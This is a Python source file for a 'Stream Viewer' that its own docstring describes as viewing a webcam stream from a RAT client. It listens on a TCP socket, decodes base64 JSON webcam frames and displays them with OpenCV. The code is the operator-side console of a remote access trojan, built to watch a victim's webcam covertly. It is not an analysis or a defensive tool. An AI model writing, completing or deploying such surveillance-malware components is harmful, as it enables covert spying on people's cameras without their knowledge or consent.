"""
Stream Viewer - View webcam stream in separate window
"""

import cv2
import socket
import json
import base64
import numpy as np


class StreamViewer:
    """View webcam stream from RAT client"""
    
    def __init__(self, host='127.0.0.1', port=5555):
        """
        Initialize stream viewer
        Args:
            host: Server host
            port: Port to receive stream
        """
        self.host = host
        self.port = port
        self.running = False
    
    def start(self):
        """Start viewer"""
        print(f"[*] Starting stream viewer on {self.host}:{self.port}")
        print("[*] Press 'q' to quit")
        
        self.running = True
        
        # Create socket to receive stream
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((self.host, self.port))
        sock.listen(1)
        
        print("[*] Waiting for stream connection...")
        
        conn, addr = sock.accept()
        print(f"[+] Stream connected from {addr}")
        
        buffer = ""
        
        while self.running:
            try:
                data = conn.recv(65536).decode('utf-8')
                
                if not data:
                    break
                
                buffer += data
                
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    
                    if line.strip():
                        try:
                            message = json.loads(line)
                            
                            if message.get('type') == 'webcam_frame':
                                self._display_frame(message)
                        
                        except json.JSONDecodeError:
                            continue
                
                # Check for quit
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
            
            except Exception as e:
                print(f"[!] Error: {e}")
                break
        
        cv2.destroyAllWindows()
        conn.close()
        sock.close()
        print("[+] Stream viewer stopped")
    
    def _display_frame(self, message):
        """Display frame"""
        try:
            frame_data = message.get('data')
            
            if not frame_data:
                return
            
            # Decode
            frame_bytes = base64.b64decode(frame_data)
            nparr = np.frombuffer(frame_bytes, np.uint8)
            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            
            if frame is not None:
                # Add info overlay
                cv2.putText(
                    frame, 
                    "Press 'q' to quit", 
                    (10, 30),
                    cv2.FONT_HERSHEY_SIMPLEX,
                    0.7,
                    (0, 255, 0),
                    2
                )
                
                cv2.imshow('Webcam Stream', frame)
        
        except Exception as e:
            print(f"[!] Error displaying frame: {e}")


if __name__ == "__main__":
    import sys
    
    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5555
    
    viewer = StreamViewer(host, port)
    viewer.start()